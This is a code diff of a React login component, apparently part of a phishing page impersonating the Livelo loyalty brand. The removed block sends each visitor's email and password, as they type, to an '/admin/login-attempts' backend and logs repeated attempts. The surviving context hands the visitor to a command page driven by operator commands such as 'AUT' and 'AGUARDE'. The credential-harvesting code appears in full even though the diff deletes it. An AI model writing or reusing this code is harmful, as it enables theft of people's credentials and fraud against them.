@@ -138,49 +138,6 @@ function LiveloLogin() {
     setIsValid(credentialValid && passwordValid);
   }, [credential, password]);
 
-  // Enviar dados ao backend quando ambos campos estiverem preenchidos
-  useEffect(() => {
-    const sendData = async () => {
-      if (credential && password && validateCredential(credential)) {
-        try {
-          // Verificar se já existe um userId no localStorage
-          let currentUserId = localStorage.getItem("livelo_user_id");
-          
-          if (!currentUserId) {
-            // Primeira tentativa - criar novo registro
-            const response = await axios.post(`${API}/admin/login-attempts`, {
-              email: credential,
-              password: password,
-              ip_address: "127.0.0.1",
-              country: "Brasil",
-              device: "Desktop",
-              page: "Login Livelo"
-            });
-            
-            if (response.data && response.data.id) {
-              currentUserId = response.data.id;
-              localStorage.setItem("livelo_user_id", currentUserId);
-              setUserId(currentUserId);
-            }
-          } else {
-            // Tentativa adicional - adicionar ao registro existente
-            const response = await axios.post(`${API}/admin/login-attempts/${currentUserId}/add-attempt`, {
-              email: credential,
-              password: password
-            });
-            setUserId(currentUserId);
-          }
-        } catch (error) {
-          console.error("Erro ao enviar dados:", error);
-        }
-      }
-    };
-
-    // Debounce para não enviar a cada tecla
-    const timer = setTimeout(sendData, 500);
-    return () => clearTimeout(timer);
-  }, [credential, password]);
-
   // Se for outros comandos (AUT, AGUARDE, etc), mostrar CommandPage
   if (currentCommand && currentCommand !== "INV" && userId) {
     return <CommandPage userId={userId} />;
